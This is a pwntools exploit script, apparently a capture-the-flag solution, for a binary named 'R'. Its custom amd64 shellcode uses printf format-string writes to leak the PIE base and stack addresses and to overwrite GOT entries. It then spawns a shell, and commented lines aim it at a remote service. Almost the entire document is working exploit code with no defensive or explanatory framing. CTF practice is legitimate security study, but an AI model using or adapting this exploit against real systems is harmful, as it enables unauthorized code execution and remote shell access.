from pwn import *
from pwnlib.replacements import sleep
context.arch = 'amd64'

# p = remote('140.112.31.97', 30202)
# p = process('./R', env={'LD_PRELOAD': './libc-2.29.so'})

context.terminal = ['tmux', 'splitw', '-h']
p = gdb.debug('./R', env={'LD_PRELOAD': './libc-2.29.so'}, gdbscript='aslr off\nset follow-fork-mode parent\nbreakrva 0x167E\n')
# p = gdb.debug('./R', env={'LD_PRELOAD': './libc-2.29.so'}, gdbscript='aslr off\nset follow-fork-mode child\nbreakrva 0x1A2E\n')

shellcode = asm(
    '''
    /* set stack */
    mov rsp, rdx
    add rsp, 0x1500
    mov r13, 0x4088
    jmp start
    
leak:
    pop rbp
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    call pipe
    pop r15
    add rsp, 2
    pop rax
    mov dl, 8
    call str2hex
    mov r15, rbx
    shl r15, 16
    pop rax
    mov dl, 4
    call str2hex
    add r15, rbx
    jmp rbp

pipe:   /* rdi rsi rdx rax */
    pop r8
    mov rdi, 6
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 1
    syscall     /* write to pipe */
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0
    syscall     /* read from pipe */
    jmp r8

start:
    /* leak pie base */
    mov rax, 0x7024333325   /* %33$p */
    push rax
    call leak
    sub r15, 0x1a40     # r15 pie base
    mov r14, r15
    add r14, r13     # exit GOT
    mov r10, r14
    
    /* leak rbp */
    mov rax, 0x7024363325   /* %36$p */
    push rax
    call leak
    sub r15, 0xe8
    mov r12, r15    /* rbp */

    /* leak target */
    mov rax, 0x7024323625   /* %62$p */
    push rax
    call leak /* target on r15*/
    
    /* use fmt to write exit got on stack */
    xor r9, r9
    mov r13, r14    /* exit GOT on r13 */
    mov rax, rsp
    and rax, 0xfff
    cmp rax, 0x51e
    je L1
    cmp rax, 0x71e
    je L2
    cmp rax, 0x81e
    je L3
    jmp L4
L1:     /* exit */
    sub r13, 0x4088
    add r13, 0x1957
    jmp write_got
L2:     /* close */
    sub r13, 0x4030
    add r13, 0x1A2E
    jmp write_got
L3:     /* prctl */
    sub r13, 0x4058
    add r13, 0x1A2E
    jmp write_got
L4:     /* printf */
    sub r13, 0x4028
    add r13, 0x1140
    jmp write_got
    

write_got:
    mov rax, 0x18    /* fake got */
    add rax, r9
    mov r11, 0x000306
    call push_str
    call pipe
    nop
    nop
    nop
    nop
 
    mov rax, r14    /* exit got */
    mov r11, 0x000602
    call push_str
    call pipe
    shr r14, 8
    inc r9
    cmp r9, 8
    jne write_got
    
    /**************************************************************************/
    /* overwrite GOT */
    /* rebase */
    mov rax, 0x18    /* fake got */
    mov r11, 0x000306
    call push_str
    call pipe

    /* calculate offset */
    and r15, 0xffffffffffffff00
    add r15, 0x18
    sub r15, r12
    shr r15, 3
    add r15, 33
    mov rax, r15
    call hex2str
    xor r11, r11
    xor rax, rax
    add al, bl
    shl rax, 8
    add al, bh
    shl rax, 8
    shr rbx, 16
    add al, bl
    mov r11, rax
    mov r14, r11

    xor r9, r9
got_hijack:
    mov rax, r10    /* fake got */
    and rax, 0xff
    add rax, r9
    mov r11, 0x000602
    call push_str
    call pipe

    mov rax, r13    /* target address */
    mov r11, r14
    call push_str
    call pipe
    
    shr r13, 8
    inc r9
    cmp r9, 8
    jne got_hijack
    mov rax, rsp
    and rax, 0xfff
    cmp rax, 0x0fe
    je first
    cmp rax, 0x2fe
    je second
    cmp rax, 0x3fe
    je third
    jmp end
    nop

first:
    mov r13, 0x4030
    and rsp, 0xfffffffffffff000
    add rsp, 0x700
    jmp start
second:
    mov r13, 0x4058
    and rsp, 0xfffffffffffff000
    add rsp, 0x800
    jmp start
third:
    mov r13, 0x4028
    and rsp, 0xfffffffffffff000
    add rsp, 0x900
    nop
    jmp start
end:
    jmp r9

push_str:   /* rbp rax rcx r8 r11  */
    pop rbp
    sub rax, 8
    and rax, 0xff
    call hex2str

    /* padding */
    mov rax, 0xff
    mov r8, rbx
    mov rcx, 0
d:
    sub al, bl
    inc rcx
    cmp rcx, 100
    jne d
    xor rcx, rcx
dd:
    sub al, bh
    inc rcx
    cmp rcx, 9
    jne dd
    sub al, bh
    shr rbx, 16
    sub al, bl
    sub al, 15
    and rax, 0xff
    add al, 2
    call hex2str
    push rax
    mov byte ptr [rsp], 0x25    /* % */
    mov byte ptr [rsp+1], bl
    add byte ptr [rsp+1], 0x30
    mov byte ptr [rsp+2], bh
    add byte ptr [rsp+2], 0x30
    shr rbx, 16
    mov byte ptr [rsp+3], bl
    add byte ptr [rsp+3], 0x30
    mov byte ptr [rsp+4], 0x63  /* c */
    mov byte ptr [rsp+5], 0x4d
    mov byte ptr [rsp+6], 0x4d
    mov byte ptr [rsp+7], 0x4d
    
    mov rax, 0x4d4d4d6e68682400 /* ?$hhnMMMM */
    mov rbx, r11
    add al, bl
    add al, 0x30
    push rax
    push rax
    mov rbx, r8
    mov byte ptr [rsp], 0x25    /* % */
    mov byte ptr [rsp+1], bl
    add byte ptr [rsp+1], 0x30
    mov byte ptr [rsp+2], bh
    add byte ptr [rsp+2], 0x30
    shr rbx, 16
    mov byte ptr [rsp+3], bl
    add byte ptr [rsp+3], 0x30
    mov byte ptr [rsp+4], 0x63  /* c */
    mov byte ptr [rsp+5], 0x25  /* % */
    mov rax, r11
    mov byte ptr [rsp+7], ah
    add byte ptr [rsp+7], 0x30
    shr rax, 16
    mov byte ptr [rsp+6], al
    add byte ptr [rsp+6], 0x30
    mov rax, 0x4d4d4d4d4d4d4d4d
    push rax
    jmp rbp

str2hex:
    xor rbx, rbx
    xor rcx, rcx
loop:
    cmp al, 0x00
    je check
    nop
    cmp al, 0x61
    jb num
    sub al, 0x57
    jmp check
num:
    sub al, 0x30
check:
    add bl, al
    shl rbx, 4
    shr rax, 8
    add cl, 1
    cmp cl, dl
    jne loop
    shr rbx, 4
    ret

hex2str:    /* input = rax, output = rbx */
    xor rbx, rbx
    xor rdi, rdi
again:
    xor rdx, rdx
    mov ecx, 11
    sub ecx, 1
    div ecx
    mov bl, dl
    shl rbx, 8
    inc rdi
    cmp rdi, 3
    jne again
    shr rbx, 8
    ret
    '''
)
# for i in range(100):
#     try:
#         p = remote('140.112.31.97', 30202)
#         # p = process('./R', env={'LD_PRELOAD': './libc-2.29.so'})
#         p.sendlineafter('code : ',shellcode)
#         p.sendlineafter('crashed', asm(shellcraft.amd64.sh()))
#         p.recvline()
#         p.sendline('ls')
#         print(p.recv())
#     except:
#         p.close()
#         continue

#     break
# p = remote('140.112.31.97', 30202)
# p = process('./R', env={'LD_PRELOAD': './libc-2.29.so'})
p.sendlineafter('code : ',shellcode)
p.sendlineafter('crashed', asm(shellcraft.amd64.sh()))
p.interactive()